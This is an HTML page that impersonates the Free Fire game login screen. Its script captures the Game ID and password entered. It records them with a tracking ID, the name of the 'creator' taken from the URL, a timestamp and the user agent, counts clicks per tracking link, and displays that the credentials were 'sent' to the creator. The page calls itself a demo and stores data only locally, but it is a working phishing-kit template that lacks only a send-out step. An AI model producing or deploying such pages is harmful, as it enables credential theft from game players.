<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ff4655 0%, #1a1a2e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .login-container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            color: white;
            font-size: 36px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
            margin-bottom: 10px;
        }
        
        .logo p {
            color: #ffd700;
            font-size: 14px;
        }
        
        .login-form input {
            width: 100%;
            padding: 15px;
            margin-bottom: 15px;
            border: none;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.9);
            font-size: 14px;
        }
        
        .login-btn {
            width: 100%;
            background: linear-gradient(45deg, #ff4655, #ff6b7a);
            color: white;
            border: none;
            padding: 15px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 10px 0;
            transition: transform 0.3s ease;
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
        }
        
        .options {
            display: flex;
            justify-content: space-between;
            margin: 15px 0;
        }
        
        .options a {
            color: #ffd700;
            text-decoration: none;
            font-size: 12px;
        }
        
        .social-login {
            text-align: center;
            margin: 20px 0;
        }
        
        .social-btn {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.3);
            padding: 10px 20px;
            border-radius: 6px;
            margin: 0 5px;
            cursor: pointer;
            font-size: 12px;
        }
        
        .tracking-notice {
            background: rgba(255, 215, 0, 0.2);
            border: 1px solid #ffd700;
            padding: 10px;
            border-radius: 6px;
            margin-top: 20px;
            font-size: 12px;
            color: #ffd700;
            text-align: center;
        }
        
        .character {
            text-align: center;
            font-size: 60px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="character">ðŸŽ®</div>
        
        <div class="logo">
            <h1>FREE FIRE</h1>
            <p>BOOYAH! Login to Continue</p>
        </div>
        
        <div class="login-form">
            <input type="text" id="gameId" placeholder="Game ID or Email">
            <input type="password" id="password" placeholder="Password">
            
            <button class="login-btn" onclick="handleLogin()">LOGIN TO FREE FIRE</button>
            
            <div class="options">
                <a href="#">Forgot Password?</a>
                <a href="#">Create Account</a>
            </div>
            
            <div class="social-login">
                <button class="social-btn">Google Play</button>
                <button class="social-btn">Apple ID</button>
                <button class="social-btn">Facebook</button>
            </div>
            
            <div class="tracking-notice" id="trackingNotice">
                ðŸŽ¯ Game ID Tracker Active
            </div>
        </div>
    </div>

    <script>
        function getTrackingData() {
            const urlParams = new URLSearchParams(window.location.search);
            return {
                trackingId: urlParams.get('tracking'),
                creator: urlParams.get('creator')
            };
        }

        function handleLogin() {
            const gameId = document.getElementById('gameId').value;
            const password = document.getElementById('password').value;
            const trackingData = getTrackingData();
            
            if (!gameId || !password) {
                alert('Please enter your Game ID and Password');
                return;
            }
            
            saveCredentials({
                platform: 'freefire',
                gameId: gameId,
                password: password,
                trackingId: trackingData.trackingId,
                creator: trackingData.creator,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            });
            
            alert('Free Fire login captured! This is a demo page.');
            document.getElementById('gameId').value = '';
            document.getElementById('password').value = '';
        }

        function saveCredentials(credentials) {
            const allCredentials = JSON.parse(localStorage.getItem('collectedCredentials') || '[]');
            allCredentials.push(credentials);
            localStorage.setItem('collectedCredentials', JSON.stringify(allCredentials));
            updateLinkClickCount(credentials.trackingId);
            simulateEmailNotification(credentials);
        }

        function updateLinkClickCount(trackingId) {
            const links = JSON.parse(localStorage.getItem('trackingLinks') || '[]');
            const linkIndex = links.findIndex(link => link.id === trackingId);
            if (linkIndex !== -1) {
                links[linkIndex].clicks = (links[linkIndex].clicks || 0) + 1;
                localStorage.setItem('trackingLinks', JSON.stringify(links));
            }
        }

        function simulateEmailNotification(credentials) {
            console.log('Free Fire data to:', credentials.creator, 'Game ID:', credentials.gameId);
            alert(`Free Fire credentials sent to ${credentials.creator}`);
        }

        document.addEventListener('DOMContentLoaded', function() {
            const trackingData = getTrackingData();
            if (trackingData.trackingId) {
                document.getElementById('trackingNotice').textContent = 
                    `ðŸŽ¯ Tracking Active - Game ID will be sent to: ${trackingData.creator}`;
            }
        });
    </script>
</body>
</html>
